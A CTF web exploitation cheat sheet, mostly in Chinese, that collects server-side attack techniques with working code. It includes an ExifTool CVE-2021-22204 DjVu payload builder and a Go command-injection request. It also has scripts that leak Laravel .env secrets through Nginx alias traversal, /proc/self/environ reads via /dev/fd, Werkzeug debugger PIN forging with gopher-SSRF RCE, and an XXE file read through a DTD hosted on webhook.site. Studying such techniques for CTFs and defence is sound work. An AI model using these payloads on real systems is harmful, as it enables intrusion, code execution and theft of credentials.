# CTF Web - Advanced Server-Side Techniques

高级服务端利用技巧汇总。

## Table of Contents
- [ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)](#exiftool-cve-2021-22204--djvu-perl-injection-0xfun-2026)
- [Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)](#go-runebyte-length-mismatch--command-injection-vuwctf-2025)
- [Zip Symlink Path Traversal (UTCTF 2024)](#zip-symlink-path-traversal-utctf-2024)
- [Path Traversal Bypass Techniques](#path-traversal-bypass-techniques)
  - [Brace Stripping](#brace-stripping)
  - [Double URL Encoding](#double-url-encoding)
  - [Python os.path.join](#python-ospathjoin)
- [Nginx Alias Traversal to Leak .env (VolgaCTF 2018)](#nginx-alias-traversal-to-leak-env-volgactf-2018)
- [/dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)](#devfd-symlink-to-bypass-proc-filter-google-ctf-2017)
- [Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)](#unicode-homoglyph-path-traversal-u2e2e-csaw-2017)
- [Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)](#ruby-regexpescape-multibyte-character-bypass-square-ctf-2017)
- [Flask/Werkzeug Debug Mode Exploitation](#flaskwerkzeug-debug-mode-exploitation)
- [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
- [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)

另见 [server-side-advanced-2.md](server-side-advanced-2.md) 的第 2 部分（SSRF 到 Docker、Castor XML、Apache ErrorDocument、SQLite 路径穿越、HQL 不间断空格、base64 路径穿越、8.3 短文件名绕过、`parse_url` 的 `@` 绕过、PHP `zip://` LFI、XSS 到 SSTI、INSERT 列偏移、会话 cookie 伪造）。另见 [server-side-advanced-3.md](server-side-advanced-3.md) 的第 3 部分（WAV polyglot、多斜杠 URL 绕过、Xalan `math:random`、SoapClient CRLF、gopher 无主机、SSRF 凭据泄露）。另见 [server-side-advanced-4.md](server-side-advanced-4.md) 的第 4 部分（WeasyPrint SSRF、MongoDB 正则注入、Pongo2 SSTI、ZIP PHP webshell、`basename()` 绕过、wget CRLF SMTP、Gopher→MySQL SQLi、React Server Components RCE、AMQP/TLS sslsplit、CairoSVG XXE、Bazaar 仓库重建）。

---

## ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)

**受影响版本：** ExifTool ≤ 12.23

**漏洞点：** DjVu 的 ANTa 注释块会被 Perl `eval` 解析。

**构造最小 DjVu 利用：**
```python
import struct

def make_djvu_exploit(command):
    # ANTa chunk with Perl injection
    ant_data = f'(metadata "\\c${{{command}}}")'.encode()

    # INFO chunk (1x1 image)
    info = struct.pack('>HHBBii', 1, 1, 24, 0, 300, 300)

    # Build DJVU FORM
    djvu_body = b'DJVU'
    djvu_body += b'INFO' + struct.pack('>I', len(info)) + info
    if len(info) % 2: djvu_body += b'\x00'
    djvu_body += b'ANTa' + struct.pack('>I', len(ant_data)) + ant_data
    if len(ant_data) % 2: djvu_body += b'\x00'

    # FORM header
    # AT&T = optional 4-byte prefix; FORM = IFF chunk type (separate fields)
    djvu = b'AT&T' + b'FORM' + struct.pack('>I', len(djvu_body)) + djvu_body
    return djvu

exploit = make_djvu_exploit("system('cat /flag.txt')")
with open('exploit.djvu', 'wb') as f:
    f.write(exploit)
```

**检测：** 先确认 ExifTool 版本。DjVu 是经典攻击面，任何使用 ExifTool 处理图片的上传点都值得测试。

---

## Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)

**模式（Go Go Cyber Ranger）：** Go 用 `len([]rune(input)) > 32` 做长度校验，但复制时按 `len([]byte(input))` 处理。

**关键点：** UTF-8 多字节字符（如 emoji 为 4 字节）只算 1 个 rune，却占 4 个字节，因此可导致溢出。

**利用：** 8 个 emoji（32 字节、8 个 rune）再拼接 `";cmd\n"`，总计 40 字节。这样既能通过 32-rune 检查，又会溢出到相邻缓冲区。

```bash
# If flag check uses: exec.Command("/bin/sh", "-c", fmt.Sprintf("test \"%s\" = \"%s\"", flag, input))
# Inject: ";od f*\n"
payload='🔥🔥🔥🔥🔥🔥🔥🔥";od f*\n'
curl -X POST http://target/check -d "secret=$payload"
```

**检测：** Go Web 应用若先按 `[]rune` 检查长度，后续却用字节级操作（`copy`、缓冲区写入），就要重点看 rune/byte 不一致问题。

---

## Zip Symlink Path Traversal (UTCTF 2024)

**模式（Schrödinger）：** 服务端解压上传的 ZIP，但不检查其中的符号链接。

```bash
# Create symlink to target file, zip with -y to preserve
ln -s /path/to/flag.txt file.txt
zip -y exploit.zip file.txt
# Upload → server follows symlink → exposes file content
```

**检测：** 凡是“上传+解压”端点都要测。`zip -y` 会保留符号链接，许多 ZIP 解压工具默认会跟随它们。

---

## Path Traversal Bypass Techniques

### Brace Stripping
`{.}{.}/flag.txt` 经过处理后可能变成 `../flag.txt`

### Double URL Encoding
`%252E%252E%252F` 在两次解码后会变成 `../`

### Python os.path.join
`os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd`（绝对路径会忽略前缀）

---

### Nginx Alias Traversal to Leak .env (VolgaCTF 2018)

**模式：** 若 Nginx `alias` 配置错误，当 `location` 路径不以 `/` 结尾而 `alias` 以 `/` 结尾时，会发生路径拼接不一致，导致 `..` 可跳出映射目录。

```nginx
# Vulnerable Nginx configuration:
location /laravel {
    alias /var/www/html/public/;
}
# Note: /laravel has NO trailing slash, but alias has one
# This creates a join mismatch: /laravel<anything> maps to /var/www/html/public/<anything>
```

```bash
# Exploit: traverse out of the public/ directory to read .env
GET /laravel../.env HTTP/1.1
# Nginx resolves: alias "/var/www/html/public/" + "../.env" = /var/www/html/.env

# Read application source
GET /laravel../app/Http/Controllers/AuthController.php HTTP/1.1

# Read other config files
GET /laravel../config/database.php HTTP/1.1
GET /laravel../storage/logs/laravel.log HTTP/1.1
```

```python
import requests

target = "http://target"

# Leak Laravel .env file (contains APP_KEY, DB credentials, etc.)
r = requests.get(f"{target}/laravel../.env")
if r.status_code == 200:
    print("[+] .env contents:")
    print(r.text)
    # Look for APP_KEY, DB_PASSWORD, API keys, etc.
```

**检测清单：**
```text
# Test for the misconfiguration on common paths:
/static../
/assets../
/public../
/media../
/uploads../
/laravel../
# Any location block using alias without matching trailing slashes
```

**关键点：** 当 Nginx 的 `location` 没有尾斜杠，而对应 `alias` 有尾斜杠时，路径会被不安全地拼接，允许使用 `..` 跳出别名目录。Laravel 部署里 `/laravel` 映射到 `public/` 是常见误配点。审计时务必检查 `location` 与 `alias` 结尾斜杠是否一致。

---

## Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)

**模式：** 在某些 Python HTTP 后端和 Unicode 规范化链路里，U+2E2E（REVERSED QUESTION MARK，UTF-8：`E2 B8 AE`）会规范化为句点（U+002E，`0x2E`）。发送 `%E2%B8%AE%E2%B8%AE/flag.txt` 就能绕过只拦 ASCII 点号的检查（如直接屏蔽 `..`），而最终解析路径会变成 `../flag.txt`。

```bash
# Standard path traversal blocked by ASCII dot check:
curl "http://target/files/../../flag.txt"   # blocked: contains ".."

# U+2E2E homoglyph bypass:
curl "http://target/files/%E2%B8%AE%E2%B8%AE/flag.txt"
# Backend normalizes E2B8AE → 0x2E (period), resolves as ../flag.txt
```

```python
import requests

# U+2E2E = REVERSED QUESTION MARK (⸮), UTF-8: 0xE2 0xB8 0xAE
# Normalizes to FULL STOP (.) in NFKC/NFC after some transformations

homoglyph_dot = '\u2E2E'
payload = f"{homoglyph_dot}{homoglyph_dot}/flag.txt"

r = requests.get(f"http://target/files/{payload}")
# If backend normalizes Unicode before filesystem access but after validation:
print(r.text)
```

**其他可尝试的 Unicode 点号同形字符：**
```text
U+2E2E  ⸮  REVERSED QUESTION MARK  (E2 B8 AE) → .
U+FF0E  ．  FULLWIDTH FULL STOP     (EF BC 8E) → .
U+2024  ․  ONE DOT LEADER          (E2 80 A4) → .
U+FE52  ﹒  SMALL FULL STOP        (EF B9 92) → .
```

**关键点：** 校验层与执行层对 Unicode 规范化的处理不一致时，就能利用非 ASCII 点号同形字符做路径穿越。U+2E2E 是比全角点（U+FF0E）更冷门的替代选项。测试时建议直接比较 NFKC 和 NFC 的归一化结果，例如用 Python 的 `unicodedata.normalize('NFKC', char)`。

---

## Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)

**模式：** Ruby 的 `Regexp.escape` 是逐字节工作的。若输入 `%bf` 后跟 `%5c`（反斜杠），在 GBK/Big5 中会组合成一个合法双字节字符，从而“吃掉”那个反斜杠，导致后续字符没有按预期转义。

```ruby
# Regexp.escape escapes special chars by prepending backslash
# e.g., Regexp.escape("a.b") → "a\\.b"

# Vulnerability: byte 0xBF followed by 0x5C (backslash) is a valid GBK character
# Regexp.escape sees 0xBF → not a special char, passes through
# Then sees 0x5C → escapes it to 0x5C 0x5C (double backslash)
# But in GBK: 0xBF 0x5C is ONE character (the lead byte absorbs the backslash)
# So the "escape" produces: 0xBF 0x5C 0x5C = GBK_char + 0x5C
# The second backslash then escapes the NEXT character, not the intended one

# Result: subsequent input characters become unescaped in the regex
```

```python
# In a CTF context: HTTP request with GBK lead byte in parameter
import requests

# %bf%5c in URL-encoded form — in GBK this is one character
# When Ruby calls Regexp.escape on the input, the backslash is consumed
payload = "\xbf\x5c" + ".*"   # GBK char eats the backslash; .* is now unescaped in regex

r = requests.get("http://target/search", params={"q": payload})
# If backend uses: /#{Regexp.escape(params[:q])}/  as a regex pattern
# The .* passes through unescaped, matching any string
```

**利用场景：**
```ruby
# Vulnerable code:
pattern = /#{Regexp.escape(user_input)}/
if flag.match(pattern)
  puts "Match!"
end

# Inject: "\xbf\x5c.*" → Regexp.escape produces "\xbf\\\\..*"
# In GBK context: first two bytes are one char, leaving ".*" unescaped
# Pattern becomes: /\xbf\\.*/ which in GBK matches the flag (greedy .*)
```

**关键点：** 基于字节的转义函数很容易被多字节字符注入绕过。GBK/Big5 前导字节 `0xBF` 与 `0x5C` 可组成一个合法字符，直接吞掉 `Regexp.escape` 加上的反斜杠，导致后面的内容保持未转义。审计 Ruby 正则校验时，尤其要关注支持中日韩字符集的输入路径。

---

## /dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)

**模式：** 当应用在文件读取参数中屏蔽 `/proc` 以防访问进程信息时，Linux 上的 `/dev/fd` 可作为替代入口，因为它本质上是指向 `/proc/self/fd` 的符号链接。

```bash
# Bypass /proc filter to read environment variables
curl "http://target/?f=/dev/fd/../environ"
# /dev/fd -> /proc/self/fd, then ../ traverses to /proc/self/

# Read command line
curl "http://target/?f=/dev/fd/../cmdline"

# Read memory maps
curl "http://target/?f=/dev/fd/../maps"

# Read specific file descriptor contents
curl "http://target/?f=/dev/fd/0"   # stdin
curl "http://target/?f=/dev/fd/1"   # stdout
curl "http://target/?f=/dev/fd/3"   # often a database or config file
```

**其他绕过 `/proc` 过滤的路径：**
```text
/dev/fd/../environ         # → /proc/self/environ
/dev/fd/../cmdline         # → /proc/self/cmdline
/dev/fd/../maps            # → /proc/self/maps
/dev/fd/../status          # → /proc/self/status
/dev/fd/../cwd/app.py      # → /proc/self/cwd/app.py (working dir)
/dev/stdin/../environ      # /dev/stdin → /proc/self/fd/0, then ../
```

**关键点：** Linux 上 `/dev/fd` 是 `/proc/self/fd` 的符号链接。利用 `../` 向上跳即可到达 `/proc/self/`，从而绕过对字面量 `/proc` 的黑名单。同理，`/dev/stdin`、`/dev/stdout`、`/dev/stderr` 也都能作为进入 `/proc/self/fd/` 的跳板。

---

## Flask/Werkzeug Debug Mode Exploitation

**模式（Meowy, Nullcon 2026）：** Flask 应用启用了 Werkzeug 调试器，同时 session secret 较弱。

**攻击链：**
1. **爆破 session secret：** 若 secret 来自弱随机源（如 `random_word` 库、短字符串）：
   ```bash
   flask-unsign --unsign --cookie "eyJ..." --wordlist wordlist.txt
   # Or brute-force programmatically:
   for word in wordlist:
       try:
           data = decode_flask_cookie(cookie, word)
           print(f"Secret: {word}, Data: {data}")
       except: pass
   ```
2. **伪造管理员会话：** 拿到 secret 后，构造 `is_admin=True`：
   ```bash
   flask-unsign --sign --cookie '{"is_admin": true}' --secret "found_secret"
   ```
3. **通过 pycurl 做 SSRF：** 若 `/fetch` 端点使用 pycurl，可打 `http://127.0.0.1/admin/flag`
4. **绕过头检查：** 某些端点会校验 `X-Fetcher` 之类的自定义头，需要在 SSRF 请求里一并补上

**Werkzeug 调试器 RCE：** 若 `/console` 可访问：
1. **通过 SSRF 读取系统标识：** `/etc/machine-id`、`/sys/class/net/eth0/address`
2. **获取 console SECRET：** 拉取 `/console` 页面，从 HTML 中提取 `SECRET = "..."` 
3. **计算 PIN cookie：**
   ```python
   import hashlib
   h = hashlib.sha1()
   for bit in (username, "flask.app", "Flask", modfile, str(node), machine_id):
       h.update(bit.encode() if isinstance(bit, str) else bit)
   h.update(b"cookiesalt")
   cookie_name = "__wzd" + h.hexdigest()[:20]
   h.update(b"pinsalt")
   num = f"{int(h.hexdigest(), 16):09d}"[:9]
   pin = "-".join([num[:3], num[3:6], num[6:]])
   pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
   ```
4. **通过 gopher SSRF 执行：** 如果无法直连，可用 gopher 发送带 PIN cookie 的 HTTP 请求：
   ```python
   cookie = f"{cookie_name}={int(time.time())}|{pin_hash}"
   req = f"GET /console?__debugger__=yes&cmd={cmd}&frm=0&s={secret} HTTP/1.1\r\nHost: 127.0.0.1:5000\r\nCookie: {cookie}\r\n\r\n"
   gopher_url = "gopher://127.0.0.1:5000/_" + urllib.parse.quote(req)
   # SSRF to gopher_url
   ```

**关键点：** 即使 Werkzeug console 只监听 localhost，SSRF 加 gopher 仍可完整绕过 PIN 并拿到 RCE。PIN 信任 cookie 本身就足以完成认证，无需真正交互输入 PIN。

---

## XXE with External DTD Filter Bypass

**模式（PDFile, PascalCTF 2026）：** 上传接口会在 XML 中过滤关键字（如 `"file"`、`"flag"`、`"etc"`），但通过 HTTP 拉取的外部 DTD 不受该过滤影响。

**技巧：** 把恶意 DTD 放到 webhook.site 或自己的服务器上：
```xml
<!-- Remote DTD (hosted on webhook.site) -->
<!ENTITY % data SYSTEM "file:///app/flag.txt">
<!ENTITY leak "%data;">
```

```xml
<!-- Uploaded XML (clean, passes filter) -->
<?xml version="1.0"?>
<!DOCTYPE book SYSTEM "http://webhook.site/TOKEN">
<book><title>&leak;</title></book>
```

**关键点：** XML 解析器会在不经过上传关键字过滤的情况下拉取并处理外部 DTD，最终把 flag 解析到响应字段中。

**用 webhook.site API 搭建：**
```python
import requests
TOKEN = requests.post("https://webhook.site/token").json()["uuid"]
dtd = '<!ENTITY % d SYSTEM "file:///app/flag.txt"><!ENTITY leak "%d;">'
requests.put(f"https://webhook.site/token/{TOKEN}/request/...",
             json={"default_content": dtd, "default_content_type": "text/xml"})
```

---

## Path Traversal: URL-Encoded Slash Bypass

**`%2f` 绕过：** Nginx 路由匹配时不解码 `%2f`，但文件系统会解码：
```bash
curl 'https://target/public%2f../nginx.conf'
# Nginx sees "/public%2f../nginx.conf" → matches /public/ route
# Filesystem resolves to /public/../nginx.conf → /nginx.conf
```
**也可尝试：** `%2e` 表示点号、双重编码 `%252f`、以及 Windows 下的反斜杠 `\`。

---

另见 [server-side-advanced-4.md](server-side-advanced-4.md)，其中包含 WeasyPrint SSRF、MongoDB 正则注入、Pongo2 SSTI、ZIP PHP webshell、`basename()` 绕过、wget CRLF SMTP、Gopher→MySQL SQLi、React Server Components RCE、AMQP/TLS 中间人、CairoSVG XXE 和 Bazaar 仓库重建。
